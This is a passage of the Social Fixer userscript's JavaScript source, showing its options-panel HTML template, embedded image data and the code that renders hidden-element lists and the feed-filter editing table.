<help>If you don\'t want tabs created or "hiding" rules to run on profiles and pages, disable this option</help>\n			%filter_profiles% Filter posts on pages and profiles\n		</div>\n		<div class="option tab_filtering">Don\'t auto-tab these apps: %untab_apps%</div>\n		<div class="option tab_filtering">Custom App list: (format:  app_id:app_name,app_id:app_name&nbsp;&nbsp;&nbsp;&nbsp;ex: 12345:MyFarm)<br>%custom_apps%</div>\n		<div class="option tab_filtering no_search no_hover">\n			<div class="no_hover">\n				<div>\n					See the Feed Filter <b><a href="http://SocialFixer.com/feed_filter.php" style="text-decoration:underline;" target="_blank">Documentation</a></b>\n				</div>\n				<div id="bfb_filter_add_row" style="background-color:#ffffcc; font-weight:bold;">Click to add another filter: </div>\n				<table class="bfb_filter_list" border=1 width=100%>\n				<thead>\n					<tr>\n						<th><help>Select one or more specific authors to filter (hold Ctrl when clicking to select multiple). If no authors are selected, then the filter applies to post by anyone. See <a href="http://SocialFixer.com/#ff" target="_blank">Documentation</a></help>\n							Author\n						</th>\n<!--\n						<th><help>Select one or more types of posts (hold Ctrl when clicking to select multiple). If no types are selected, then the filter applies to all types of posts.  See <a href="http://SocialFixer.com/#ff" target="_blank">Documentation</a></help>\n							Type\n						</th>\n-->\n						<th><help>Select one or more Applications (hold Ctrl when clicking to select multiple). If no applications are selected, then the filter applies to all applications.  See <a href="http://SocialFixer.com/#ff" target="_blank">Documentation</a></help>\n							Application\n						</th>\n						<th><help>Match any text in the post body itself. For example, type in "politics" (without the quotes) to select all posts with the word politics in them. Regular expressions may also be used, for expert users. See <a href="http://SocialFixer.com/#ff" target="_blank">Documentation</a></help>\n							Other\n						</th>\n						<th><help>Select what to do with the posts that match your critieria. For a full explanation, see the <a href="http://SocialFixer.com/#ff" target="_blank">Documentation</a>.</help>\n							Action\n						</th>\n						<th>&nbsp;</th>\n					</tr>\n				</thead>\n				<tbody id="bfb_filter_list"></tbody>\n				<tfoot id="bfb_filter_list_tfoot"></tfoot>\n				</table>\n			</div>\n		</div>\n		\n		<!-- TIMELINE -->\n		<div class="option tab_timeline">\n			%timeline_show_panel% Show the Timeline Option panel in the upper left on Timeline pages\n		</div>\n		<div class="option tab_timeline">\n			%timeline_single_column% Display posts in a single column with max width %timeline_single_column_width% px\n		</div>\n		<div class="option tab_timeline">\n			%timeline_white_background% Change the background color to white\n		</div>\n		<div class="option tab_timeline">\n			%timeline_hide_cover_photo% Hide cover photos\n		</div>\n		<div class="option tab_timeline">\n			%timeline_hide_friends_box% Hide the "Friends" box\n		</div>\n		<div class="option tab_timeline">\n			%timeline_hide_maps% Hide maps of check-ins\n		</div>\n		<div class="option tab_timeline no_search">\n			Social Fixer can only change how <b>you</b> see Timeline pages. It cannot change how others see your Timeline, or what functionality they have, because Social Fixer is an application that runs in your browser only. For details, see the <a href="http://SocialFixer.com/faq.php#timeline" target="_blank">FAQ entry about Timeline</a>.\n		</div>\n		\n\n		<!-- HIDDEN ELEMENTS -->\n		\n		<div class="option tab_hidden">\n			<div class="no_hover">\n			Some sections of the page may be hidden by hovering over them, and clicking on the "x" that appears. You can unhide sections by removing them from the list here.\n			</div>\n			<div class="no_hover"><b>Hidden Page Elements</b></div>\n			<div class="no_hover" style="padding:10px 0px;">\n				%hidden_elements_list%\n			</div>\n			<div class="no_hover"><b>Page Elements With "x" Removed</b></div>\n			<div class="no_hover" style="padding:10px 0px;">\n				%hidden_elements_x_list%\n			</div>\n		</div>\n\n		<!-- CHAT -->\n		\n		<div class="option tab_chat">\n			<help>Not all users have this, but many see a tall sidebar on the far right that goes all the way from the top to the bottom of the screen - but only when the screen is wide enough. This option lets you stop that bar from appearing, and instead revert to the "pop up" chat box.</help>\n			%chat_disable_sidebar% Turn off the chat sidebar on the far right (if it exists) and go back to popup chat list\n		</div>\n		<div class="option tab_chat">\n			<help>Facebook by default now shows friends it thinks you want to chat with. This restores previous behavior where all online friends are shown.</help>\n			%chat_show_all_online% Show all online friends in chat list\n			<div style="margin-left:20px;" xclass="option tab_chat">\n				%chat_hide_mobile_users% Hide "mobile" users from the chat list\n			</div>\n		</div>\n		<div class="option tab_chat">\n			<help>Group friends by online status (active on top, idle below)</help>\n			%chat_group_by_status% Group friends by online status (active on top, idle below)\n		</div>\n		<div class="option tab_chat">\n			<help>If your chat list is tall, this will hide the profile pictures so the list is more compact.</help>\n			%chat_compact% Use compact chat list (no thumbnail images)\n		</div>\n		<div class="option tab_chat">\n			<help>If you never want to chat, but Facebook puts you back online for some reason, this will force it to logout every time you load a page.</help>\n			%chat_force_offline% Automatically force chat logout on every page load		\n		</div>\n		<div class="option tab_chat">\n			<help>If you never chat at all, you can hide the whole chat dock so you never have to see it!</help>\n			%chat_hide% Hide the chat dock entirely (if you are logged in, this will NOT log you out!)\n		</div>\n		\n		<!-- THEME -->\n		\n		<div class="option tab_theme no_search no_hover">\n			Select a theme to change the style of Facebook. Only you will see these changes in your browser. Others visiting your page or profile will not see your theme.<br>\n			<div id="theme_selector" style="height:270px;overflow-y:hidden;overflow-x:auto;border:1px solid #ccc;"></div>\n			<br>\n			<span class="">Theme URL: %theme_url2% </span><input type="button" id="bfb_minimize_options" value="Click to preview"><br>\n			Note: Not all themes may be compatible with all Social Fixer options. Some themes are created by third party authors. Try them out and see what works for you!\n		</div> \n\n		<!-- CSS -->\n\n		<div class="option tab_css">Insert a reference to an external stylesheet:<br>%css_url%</div> \n		<div class="option tab_css no_hover">Add any arbitrary CSS rules to insert into the page:<br>\n		For some useful CSS code to do common things, see: <a href="http://SocialFixer.com/css_snippets.php">CSS Snippets</a> on SocialFixer.com<br>\n		%css%</div> \n		\n		<!-- USER PREFS -->\n		\n		<div id="bfb_user_prefs_option" class="option tab_user_prefs no_search no_hover">\n			<div class="no_hover">All of your stored preferences, story "read" statuses, comment counts, etc are stored in the JSON format below. This can be useful for backing up your preferences. You may also copy preferences into the box and import.</div> \n			<div class="no_hover"><textarea id="bfb_user_prefs"></textarea></div> \n		</div>\n\n		<!-- ABOUT -->\n		\n		<div class="option tab_about no_hover no_search">\n			<div class="no_hover" style="font-size:16px !important;">\n				<img src="data:image/jpeg;base64,%2F9j%2F4AAQSkZJRgABAQEASABIAAD%2F2wBDAAkGBwgHBgkIBwgKCgkLDRYPDQwMDRsUFRAWIB0iIiAdHx8kKDQsJCYxJx8fLT0tMTU3Ojo6Iys%2FRD84QzQ5Ojf%2F2wBDAQoKCg0MDRoPDxo3JR8lNzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzf%2FwAARCACIAGQDASIAAhEBAxEB%2F8QAHAAAAQUBAQEAAAAAAAAAAAAABAADBQYHAQII%2F8QANxAAAgEDAwEGBAQFBAMAAAAAAQIDAAQRBRIhMQYTIkFRcQdhgZEUMqGxFRYjQsEzUmLhktHw%2F8QAGQEAAwEBAQAAAAAAAAAAAAAAAgMEAQAF%2F8QAIREAAgICAgMBAQEAAAAAAAAAAAECEQMSITEEE0FRImH%2F2gAMAwEAAhEDEQA%2FAMdLYWiIz4B7UI3Sno2BTHpWSRyYQpy4qSkV1vlsrSOPcAAzsgYscZJ5zge3lUREfHVksoC95b37uUhMCbsdW2%2BHH12UHQTPaPNpls4mkaSeb%2FTiRioC9NxAx9BQcM927c3JVSeY1UbT7r%2BU%2B1SkqLITPP4ZZTnk9B0A%2B3lQ8miTXC5RW2E5yPOlPIkMjjbPQuwmBDGse0Dwjp9OtBX921zDskzj%2B4Ba9XGiXaflD4A6DigpIZ4gRIGDL96xSi2c8bXwP7KKtn2iF4wVkRSFycZJGOPng1IfE28iv7CyeKN17qQg5AxyP%2BqrgkYZGwD1Of8ANer24nvLJrWVw%2FiBRifMUe0tk%2FhyS1orw617rs8LQPsfGfMelcpwo5SpGlXGD7Uom5NdevKcVrOQTACz4FXuxtHgs4YAwIQZYtyATyQKqugaZcXZe5SJjbQYMsvRV9Bn1PpVstZBNIqMwCeS%2BZ96RldDYKyQ0zSY7q57904XoCanFgSMYAojT4hFbjgA4rrIH96glJHo4lSoCaNTwAKAvtKguQdyeI%2BYqRkR42PnSJyMml2yhxTRTNQ7MrglXPyzUDNpF1EHIHnxitInCuDnyoF4lIKkAg05ZZRRHkxxszHUbRu7788HOCDUcDVt7Qxd28sJXwOODjzqp7eauxS2iQ5I0xYpV7HSlTRYY9q3JBGKZWMg7Seatd1osEtqr2dye%2FOd1uRuYkegHP3%2B9QVzZPZXiQ3Qw3hLj0B5pccikxjhRadI7MyRacLlLgm5eIObcIcKh5GT6%2BeKluzFoDdF7lAAvCk%2Bo8qtNp3dnDcybdzSuVjRT1HQAfTFBaVCG%2FECRMBWKAH35rz1nc3LY9TN40cWuhzVdQltvDAoxjk1By69dRnKIzH5ij7yzmBcRzP5YLjJFRM9rcB17ycMo%2B4H1%2BvnWJJinsiY0vWTd4S4hKt64qUYJ5nGar1iXi7syf3HC89aK1K%2FKgJGjK%2FJwaDV3wPWRKPIZKYwxGR7ZoKYhfEOlVqUtPPvN4yMOemeadS6uF2nduQ8Gm6uieU7YJ2glWWXu8%2BKqhJCUldfRiKndfbGotjrt%2FxUMsbbfEdtV4VUSTJzIa7ulTvcjzf9aVNsWXjtdPB2a7U3MOnoqbcEpt4AYA49uaqmo6k%2Bp3ffyqBJjBIGMgVbPiVpcn8Ylv5mZu9wWCjkADAI%2BgH%2FAN0o4UJkjz9aOUIqV%2FQYzbSVm19nJYdR0mxvlkG%2BOMLgnjcOGz8%2BP1okoElkEfG5yx9yay3s72putGtpLaOJZInbcMnBU9K06B%2B8ijlOMsoY%2FUV5WbE8cm%2FjPXjnWSK%2FUPvbpNETnxDioueARnLd3j50fPc93EWqDlLyyd5Kc46LSot%2FAv5rkOS3V2SVwp7vkADoah9ShDXiTHOACKkF1lAGjnUK3ljzqPur%2BGWQKoPTIOOM06IE6caQI9iuCFVWU%2BnFeodP7tWy5GRwOpo%2BydJAVkUBl%2FWu3RVQdgxROXAlxorM9pG9087RLKTJ3fj9Oh%2BtV0W67jgEjPBq9ixaWIQpkMC53eeT0NSFj8NfxNnFLb6kNzAeB4uhJwATnrwadGWqtsVlSpJdmb9z1wcD2pVpb%2FDK%2FTGL60KkZB8XIz7UqL2ITRNdsrCLUWjbuiVVCiEAZOOSPtn9axm5thAV4JzW668ym1iLkgLIv5ccdfUGqNq3ZKfV9aji0SMypONxboqepPoK9CcbZJB0UJYlYAjIrXtPDJp1qH%2FN3KZ%2F8RRP8k2vY3s1cahLsu9TG0LIV8MWWA8IPnz1%2FauXL4VWJzkcmvP8uuEX%2BMnTYNMAyEHOQc1BPPfQmRhbB493hKnJHuKmmOTx0piRimcDGajSorTTZGyRxzgSd9a7icbXJjb7Go67mgg%2FPsAzjcjhhn6UXcs7SE7h7EV4EUchG9FJHnimKgpP%2FTunyFyGUkr6%2FKnZZlDB5DhQ3WuGURIY0%2Fu%2FSojVJzLJFax8ktubHkBWRjtKieU%2BLL3pdrHeWn4mEbmJJY8Yx6VeOztulxpuxjtliYgHHOCOM%2Fc1lvZyS5spR3Ev9NiMqehrWOzk8JtGkZdj8BjuyKryqOtMjtt2ENYKWPeozY4XaeijgUqrOufEKz0%2FUZLW3i%2FErHgGQPgZ8wPWlU3rf4MVhd32Zn1CHuJJ0gDMCCBuIwQasOkaRZ6PbC3so9ox4mY5Zvc0QijKtnz6U%2B1erJt8E0UkVv4hR952Yuf%2BJRvswNUSV98CknqK0btfEZuzt%2BuMnuWP2Gf8VmVu2%2B3X2qDyV0y%2FxH2hkSFMg8rXmWZGHB6U88YI61HXlo7AlDg%2FKp1L9Gyg0z1IEY5IFDSOkROCKEeG5U8yYFdit5JWwgZ3IOBTEhbbIzUNSdJWSNfF5mo9FuWfvVfxHzIzU3DobM7STPlicnAqRt9Kijx4T9aL2Rj0JpshtPudUiYbisi56YxVibtHc2enunc7JZV2Atzj2o22sePBH9lqr9pHP8TdD%2BWFQMfM8mgWT2OmFpryASXADnc3J5OaVCgb%2FEep5pU2zKPpu2b%2Bqi5z1%2FY0cSTxQFmMzA%2B9HHjmr2iNMY1GD8XYT27HHeIUyPLIrHYd0DNBIMMjFWHoRW1HG3NZH2th%2FC9orsDgSESD6j%2F3mps0bRRgnUgZunoPWm5HWNPF1rxHOCOa83GCDzUWvJe5poBnfeflUj2PmjfW2TAYqmD%2FAMc1E3LrDGzdABk5pr4bTmTtBdEnxNhwPXB%2F7p%2BJW7JsrqNFvurKK1upIzEpAbgnPT712OQRjCBV9lFTWtxxyblcHay8EcFeOoNZb2s0zVbLdPb6lc3FoeviKtH7gcH3ocvhyk7T4Fw8iKVNcl1ub8QQsZZyBjoW61m2pz97LIxOSzEsfmTUbpqF7hpZGZtgySTmiJ%2FEjseDkfvS4YFifdjXk3XRwybQo%2BVKmMjzNKnUDZ9S2RHegfKjj0qL09ibwjyEZ%2FcVJnmrn2RLo8uSq1lnxhiltptO1KAlcq0Ln1xyP3atQuZYooyZXCr6k1TO39p%2FMXZ2aGxjeSaFhLEOm4jggfQmsdfTV2ZHFruCO9Ug%2BeKMl1%2Bz7rKuzN%2FtC1VpgQSDxg%2BdNAZNIliiPWWSJHUtVku1KKuyPz55NWn4QRpJqV8zrllRSv3NUVvTrWi%2FBuAm6vZfI7V%2B2TRKKSpAyk27Zf8AtAgVIyvXbg1Ur0jayMAQQcgjOatlzKmoQvJFyrA4B6gjyqn6oduW6cU7pCPpT76ytrMuLYbRKclT5fIVE3XNvJ8zx9KMv7rfOwzwOBUTPNvmEYPhCnNQyTc7LY8RoHDZUZPNKmpHAc9MeVKmUZaPqqyYRTu78Dbj9a5qeoTxx4gAQkcEjJpUqp%2Bkfwi7FnuoWa4d5JP7i1Ca5qNt2csfxly7bd21EXq7dcfpSpUNWuQl2YbrV8dT1O5vO6SHv5C%2BxBgDNBAbRxSpVzDRwrWn%2FDGCWPQLyeLh2c7T7ADNKlWHMtNkn4DHef6L8Z%2F2mq92tQ2ySHHhOSKVKjfQtdmVXFwXkyPM0MhJldj1JxSpVOyhDLDJJNKlSojj%2F9k%3D" style="float:left;margin:10px;border:1px solid black;">\n				My name is <a href="http://MattKruse.com">Matt Kruse</a>, and I am the author of Social Fixer.<br><br>\n				To learn more about me, my family, and this project, visit the <a href="http://SocialFixer.com/about.php" target="_blank">About Me</a> page on <a href="http://SocialFixer.com">SocialFixer.com</a>!\n				<br><br>\n				<a href="http://SocialFixer.com/donate.php" target="_blank"><img border="0" src="https://www.paypal.com/en_US/i/btn/btn_donate_SM.gif"></a> to support development!\n				<br><br>\n				Thank You to the members of the <a href="http://Facebook.com/119314224763738">Social Fixer Dev</a> page for helping to find problems, helping debug them, and tirelessly testing new features!\n				<br><br>\n				Special thanks to Aj Rez for his tireless support of the suggestions forum, Brian Shea for web site assistance, Andrew Clark for Wordpress assistance, Elaine Pratt for branding advice, and Jennifer Pictorian for a fantastic logo.\n			</div> \n		</div>\n		\n	</div>\n	<br style="clear:both;">\n		\n</div>\n							';
							content = content.replace("%protocol%",protocol);
							content = content.replace(/\<help\>/gi,'<span class="bfb_help"><span class="bfb_helptext">').replace(/\<\/help\>/gi,'</span></span>');
							this.options.forEach(function(opt,i) {
								if (opt.name) {
									content = content.replace( new RegExp("%"+opt.name+"%","g"), self.renderOption(opt));
								}
							});
							// List the hidden right side panels
							var hidden_panels = split(self.get('right_panels_hidden'),';');
							var hidden_panels_html = '';
							$each(hidden_panels, function(){ 
								if(this && this.length>0) { 
									hidden_panels_html+='<div><img src="'+x_img+'" style="cursor:pointer;" onclick="i=document.querySelector(\'input[name=&quot;right_panels_hidden&quot;]\');i.value=i.value.replace(/'+this+';?/,\'\');this.parentNode.style.display=\'none\';"> '+this+'</div>'; 
								} 
							});
							content = content.replace('%right_panels_hidden_list%',hidden_panels_html);
							
							// List the hidden sections
							var hidden_elements_list = split(self.get('hidden_elements'),',');
							var hidden_elements_html = '';
							$each(hidden_elements_list, function(){ 
								if(this && this.length>0) { 
									hidden_elements_html+='<div><img src="'+x_img+'" style="cursor:pointer;" onclick="i=document.querySelector(\'input[name=&quot;hidden_elements&quot;]\');i.value=i.value.replace(/'+this+';?/,\'\');this.parentNode.style.display=\'none\';"> '+this+'</div>'; 
								} 
							});
							content = content.replace('%hidden_elements_list%',hidden_elements_html);

							// List the sections with hidden "x" options
							var hidden_elements_x_list = split(self.get('hidden_elements_x'),',');
							var hidden_elements_x_html = '';
							$each(hidden_elements_x_list, function(){ 
								if(this && this.length>0) { 
									hidden_elements_x_html+='<div><img src="'+x_img+'" style="cursor:pointer;" onclick="i=document.querySelector(\'input[name=&quot;hidden_elements_x&quot;]\');i.value=i.value.replace(/'+this+';?/,\'\');this.parentNode.style.display=\'none\';"> '+this+'</div>'; 
								} 
							});
							content = content.replace('%hidden_elements_x_list%',hidden_elements_x_html);
							
							return content;
						};

						// When the Feed Filters tab is loaded, get the typeahead content so we can generate the filters list with the typeahead content
						var render_filter_lists = function(tbody) {
							var filters_rendered = false;
							// In 10 seconds, display an error message if the filters haven't rendered
							setTimeout(function() {
								if (!filters_rendered) {
									html(tbody,'<tr><td colspan="5">Filters could not be loaded due to an unknown error in your browser. For more information <a href="http://socialfixer.com/faq.php#missingfilters" target="_blank">Click here</a> to go to the FAQ.</td></tr>');
								}
							},10000);
							get_remote_content('typeahead_new',function(response) {
								var renderOption = function(v,t,sel) {
									return '<option value="'+v+'"'+(sel?' selected':'')+'>'+t+'</option>';
								};
								var renderFilter = function(filter,options) {
									// If the filter has a "sty" criteria, ignore the whole filter
									if (filter!=null && filter.criteria && filter.criteria.sty) {
										return '';
									}
									return '<tr class="bfb_filter '+((filter!=null&&filter.disabled)?"bfb_filter_disabled":"")+'">'+renderFilterBody(filter,options)+'</tr>';
								};
								var renderFilterBody = function(filter,options,tr) {
									if (!filter || !filter.criteria) { filter = {criteria:{},actions:{}}; }
									var tds = [], c="";
									tds.push('<select class="nosave actrs" style="width:200px;" name="actrs" size="10" multiple>'+options+'</select>');
									c='<select class="nosave app_id" style="width:150px;" name="app_id" size="8" multiple onchange="var sel=false;for(var i=0;i<this.options.length;i++){if(this.options[i].selected){sel=true;break;}};var a=this.parentNode.parentNode.getElementsByClassName(\'sty\')[0];a.style.display=(sel?\'none\':\'\');">';
									for (var i in apps) { c += renderOption(i,apps[i],(filter.criteria.app_id && (i in filter.criteria.app_id))); }
									// Build a list of app_id's that are not "known"
									var app_id_custom = [];
									if (filter.criteria.app_id) {
										for (var i in filter.criteria.app_id) {
											if (typeof apps[i]=="undefined") { app_id_custom.push(i); }
										}
									}
									c+='</select><div class="app_id_custom_wrap">Custom app_id(s):<br><input name="app_id_custom" class="nosave app_id_custom" value="'+app_id_custom.join(',')+'" size="15"></div>';
									tds.push(c);
									
									tds.push('Matching text:<br> <input class="nosave regex" name="regex" value="'+(filter.criteria.regex?htmlescape(filter.criteria.regex):'')+'" size="10"><br>Advanced:<br>Use regular expressions<br>like /text|text2/<br>( | = OR )<br><br>Or Matching Selector:<br> <input class="nosave selector" name="selector" value="'+(filter.criteria.selector?htmlescape(filter.criteria.selector):'')+'" size="10">');
									tds.push(''+
									'	<input class="nosave action-hide" '+(filter.actions.hide?' checked ':'')+' type="checkbox" name="action" value="hide"> Hide<br>'+
									'	<input class="nosave action-minimize" '+(filter.actions.minimize?' checked ':'')+' name="action" value="minimize" type="checkbox"> Minimize<br>'+
									'	<input class="nosave action-addclass" '+(filter.actions.add_class?' checked ':'')+' name="action" value="add_class" type="checkbox"> Apply CSS Class: <br>'+
									'		<input class="nosave add-class" name="add_class" size="8" value="'+(filter.actions.add_class?filter.actions.add_class:'')+'" onkeyup="this.parentNode.getElementsByClassName(\'action-addclass\')[0].checked=(this.value!=\'\');"><br>'+
									'	<input class="nosave action-movetotab" '+(filter.actions.move_to_tab?' checked ':'')+' name="action" value="move_to_tab" type="checkbox"> Move to Tab: <br>'+
									'		<input class="nosave move-to-tab" name="move_to_tab" size="8" value="'+(filter.actions.move_to_tab?filter.actions.move_to_tab:'')+'" onkeyup="this.parentNode.getElementsByClassName(\'action-movetotab\')[0].checked=(this.value!=\'\');"><br>'+
									'	<input class="nosave action-stop" '+(filter.stop?' checked ':'')+' name="action" value="stop" type="checkbox"> Stop processing rules');
									var action_buttons = '<img class="bfb_up" style="cursor:pointer;" src="'+up_img+'" onclick="tr=this.parentNode.parentNode;tr.parentNode.insertBefore(tr,tr.previousSibling);"><br><img style="cursor:pointer;" src="'+delete_img+'" class="bfb_filter_delete"><br><img class="bfb_down" style="cursor:pointer;" src="'+down_img+'" onclick="tr=this.parentNode.parentNode;tr.parentNode.insertBefore(tr.nextSibling,tr);">';
									action_buttons += '<br><input type="hidden" class="nosave filter-disabled" value="'+(filter.disabled?'true':'false')+'"><img src="'+pause_img+'" class="bfb_filter_pause" onclick="this.previousSibling.value=\'true\';this.parentNode.parentNode.className+=\' bfb_filter_disabled\';" style="cursor:pointer;" title="Disable this filter but do not remove it">';
									action_buttons += '<br><img src="'+play_img+'" class="bfb_filter_play" onclick="this.parentNode.querySelector(\'input.filter-disabled\').value=\'false\';this.parentNode.parentNode.className=\'bfb_filter\';" style="cursor:pointer;" title="Enable this filter">';
									tds.push(action_buttons);
									
									// If passed in a tr, append the tds, otherwise make a string
									c = "";
									for (var i=0; i<tds.length; i++) {
										var td = tds[i];
										if (tr) { tr.appendChild( el('td',null,null,null,td) ) }
										else { c+="<td>"+td+"</td>"; }
									}
									return c;
								}

								var friends=[],pages=[];
								var list = "";
								if (response) {
									var json = parse(response.replace(/for\s*\(\s*\;\s*\;\s*\)\s*\;/,''),"Typeahead content");
									if (json.payload) {
										var connections = json.payload.entries;
										if (connections) {
											connections = connections.sort( function(a,b) { return (a.text>b.text)?1:-1; } );
											for (var i=0; i<connections.length; i++) {
												var c = connections[i];
												if (c.type=="user") { friends.push(c); }
												if (c.type=="page") { pages.push(c); }
											}
											friends = friends.sort( function(a,b) { return (a.text>b.text)?1:-1; } );
											pages = pages.sort( function(a,b) { return (a.text>b.text)?1:-1; } );
											var renderAuthorOptions = function(friendlist,pagelist,filter) {
												if (!filter || !filter.criteria) { filter = {criteria:{},actions:{}}; }
												var list = '<optgroup label="Friends">';
												for (var i=0; i<friends.length; i++) {
													list += renderOption(friends[i].uid,friends[i].text,(filter.criteria.actrs && (friends[i].uid in filter.criteria.actrs)));
												}
												list += '</optgroup>';
												list += '<optgroup label="Pages">';
												for (var i=0; i<pages.length; i++) {
													list += renderOption(pages[i].uid,pages[i].text,(filter.criteria.actrs && (pages[i].uid in filter.criteria.actrs)));
												}
												list += '</optgroup>';
												return list;
											}
											// For each filter, render the filter. Pass in the options for authors
											var filters = self.get('filters');
											var fcontent = "";
											if (filters && filters.length) {
												for (var i=0; i<filters.length; i++) {
													fcontent += renderFilter(filters[i],renderAuthorOptions(friends,pages,filters[i]));
												}
											}
											// If there are no filters, create an empty shell
											if (!filters || filters.length==0 || fcontent=='') {
												fcontent = renderFilter(null,renderAuthorOptions(friends,pages,null));
											}
											
											// Populate all the content into the tbody
											filters_rendered = true;
											html(tbody,fcontent);
										}
										else {
											filters_rendered = true;
											html(tbody,'<tr><td colspan="5">Error: Could not render filter selectors. No connections. <a href="http://socialfixer.com/faq.php#missingfilters" target="_blank">Click here</a> for details!</td></tr>');
										}
									}
									else {
										filters_rendered = true;
										html(tbody,'<tr><td colspan="5">Error: Could not render filter selectors. No json.payload. <a href="http://socialfixer.com/faq.php#missingfilters" target="_blank">Click here</a> for details!</td></tr>');
									}
								}
								else {
									filters_rendered = true;
									add_error('<tr><td colspan="5">Error: Could not render filter selectors. No response! <a href="http://socialfixer.com/faq.php#missingfilters" target="_blank">Click here</a> for details!</td></tr>');
								}
								
								var add_filter = function(position) {
									var body = renderFilterBody(null,renderAuthorOptions(friends,pages,null));
									var tr = el('tr','bfb_filter');
									renderFilterBody(null,renderAuthorOptions(friends,pages,null),tr);
									if (position=="top") {
										insertFirst( tbody, tr );
									}
									else {
										append( tbody, tr );
									}
								}
								// Attach an "add" button
								if (!QS($('bfb_filter_add_row'),'input')) {
									append($('bfb_filter_add_row'),button('Add New Filter at the Top', function(){ add_filter('top'); },null));
									append($('bfb_filter_add_row'),button('Add New Filter at the Bottom',function(){ add_filter('bottom'); },null));
								}
								// Attach "delete" functionality
								QSA(tbody,'.bfb_filter_delete',function(del) {
									bind(del,'click',function() {
										if(confirm('Delete this filter row?')){
											var tr=del.parentNode.parentNode;
											tr.parentNode.removeChild(tr);
											// If there are no more filters left, add an empty one
											if (!QS(tbody,'tr.bfb_filter')) {
												add_filter('bottom');
											}
										}
									});
								});
							});
						};
							
						this.displayOptions = function(tab_id) {
							var doc = document;
							var optionsContent = this.render();
							var options_icon = "data:image/png,%89PNG%0D%0A%1A%0A%00%00%00%0DIHDR%00%00%002%00%00%002%08%06%00%00%00%1E%3F%88%B1%00%00%00%09pHYs%00%00.%23%00%00.%23%01x%A5%3Fv%00%00%0AMiCCPPhotoshop%20ICC%20profile%00%00x%DA%9DSwX%93%F7%16%3E%DF%F7e%0FVB%D8%F0%B1%97l%81%00%22%23%AC%08%C8%10Y%A2%10%92%00a%84%10%12%40%C5%85%88%0AV%14%15%11%9CHU%C4%82%D5%0AH%9D%88%E2%A0(%B8gA%8A%88Z%8BU%5C8%EE%1F%DC%A7%B5%7Dz%EF%ED%ED%FB%D7%FB%BC%E7%9C%E7%FC%CEy%CF%0F%80%11%12%26%91%E6%A2j%009R%85%3C%3A%D8%1F%8FOH%C4%C9%BD%80%02%15H%E0%04%20%10%E6%CB%C2g%05%C5%00%00%F0%03yx~t%B0%3F%FC%01%AFo%00%02%00p%D5.%24%12%C7%E1%FF%83%BAP%26W%00%20%91%00%E0%22%12%E7%0B%01%90R%00%C8.T%C8%14%00%C8%18%00%B0S%B3d%0A%00%94%00%00ly%7CB%22%00%AA%0D%00%EC%F4I%3E%05%00%D8%A9%93%DC%17%00%D8%A2%1C%A9%08%00%8D%01%00%99(G%24%02%40%BB%00%60U%81R%2C%02%C0%C2%00%A0%AC%40%22.%04%C0%AE%01%80Y%B62G%02%80%BD%05%00v%8EX%90%0F%40%60%00%80%99B%2C%CC%00%208%02%00C%1E%13%CD%03%20L%03%A00%D2%BF%E0%A9_p%85%B8H%01%00%C0%CB%95%CD%97K%D23%14%B8%95%D0%1Aw%F2%F0%E0%E2!%E2%C2l%B1Ba%17)%10f%09%E4%22%9C%97%9B%23%13H%E7%03L%CE%0C%00%00%1A%F9%D1%C1%FE8%3F%90%E7%E6%E4%E1%E6f%E7l%EF%F4%C5%A2%FEk%F0o%22%3E!%F1%DF%FE%BC%8C%02%04%00%10N%CF%EF%DA_%E5%E5%D6%03p%C7%01%B0u%BFk%A9%5B%00%DAV%00h%DF%F9%5D3%DB%09%A0Z%0A%D0z%F9%8By8%FC%40%1E%9E%A1P%C8%3C%1D%1C%0A%0B%0B%ED%25b%A1%BD0%E3%8B%3E%FF3%E1o%E0%8B~%F6%FC%40%1E%FE%DBz%F0%00q%9A%40%99%AD%C0%A3%83%FDqanv%AER%8E%E7%CB%04B1n%F7%E7%23%FE%C7%85%7F%FD%8E)%D1%E24%B1%5C%2C%15%8A%F1X%89%B8P%22M%C7y%B9R%91D!%C9%95%E2%12%E9%7F2%F1%1F%96%FD%09%93w%0D%00%AC%86O%C0N%B6%07%B5%CBl%C0~%EE%01%02%8B%0EX%D2v%00%40~%F3-%8C%1A%0B%91%00%10g42y%F7%00%00%93%BF%F9%8F%40%2B%01%00%CD%97%A4%E3%00%00%BC%E8%18%5C%A8%94%17L%C6%08%00%00D%A0%81*%B0A%07%0C%C1%14%AC%C0%0E%9C%C1%1D%BC%C0%17%02a%06D%40%0C%24%C0%3C%10B%06%E4%80%1C%0A%A1%18%96A%19T%C0%3A%D8%04%B5%B0%03%1A%A0%11%9A%E1%10%B4%C118%0D%E7%E0%12%5C%81%EBp%17%06%60%18%9E%C2%18%BC%86%09%04A%C8%08%13a!%3A%88%11b%8E%D8%22%CE%08%17%99%8E%04%22aH4%92%80%A4%20%E9%88%14Q%22%C5%C8r%A4%02%A9Bj%91%5DH%23%F2-r%149%8D%5C%40%FA%90%DB%C8%202%8A%FC%8A%BCG1%94%81%B2Q%03%D4%02u%40%B9%A8%1F%1A%8A%C6%A0s%D1t4%0F%5D%80%96%A2k%D1%1A%B4%1E%3D%80%B6%A2%A7%D1K%E8ut%00%7D%8A%8Ec%80%D11%0Ef%8C%D9a%5C%8C%87E%60%89X%1A%26%C7%16c%E5X5V%8F5c%1DX7v%15%1B%C0%9Ea%EF%08%24%02%8B%80%13%EC%08%5E%84%10%C2l%82%90%90GXLXC%A8%25%EC%23%B4%12%BA%08W%09%83%841%C2'%22%93%A8O%B4%25z%12%F9%C4xb%3A%B1%90XF%AC%26%EE!%1E!%9E%25%5E'%0E%13_%93H%24%0E%C9%92%E4N%0A!%25%902I%0BIkH%DBH-%A4S%A4%3E%D2%10i%9CL%26%EB%90m%C9%DE%E4%08%B2%80%AC%20%97%91%B7%90%0F%90O%92%FB%C9%C3%E4%B7%14%3A%C5%88%E2L%09%A2%24R%A4%94%12J5e%3F%E5%04%A5%9F2B%99%A0%AAQ%CD%A9%9E%D4%08%AA%88%3A%9FZIm%A0vP%2FS%87%A9%134u%9A%25%CD%9B%16C%CB%A4-%A3%D5%D0%9Aigi%F7h%2F%E9t%BA%09%DD%83%1EE%97%D0%97%D2k%E8%07%E9%E7%E9%83%F4w%0C%0D%86%0D%83%C7Hb(%19k%19%7B%19%A7%18%B7%19%2F%99L%A6%05%D3%97%99%C8T0%D72%1B%99g%98%0F%98oUX*%F6*%7C%15%91%CA%12%95%3A%95V%95~%95%E7%AATUsU%3F%D5y%AA%0BT%ABU%0F%AB%5EV%7D%A6FU%B3P%E3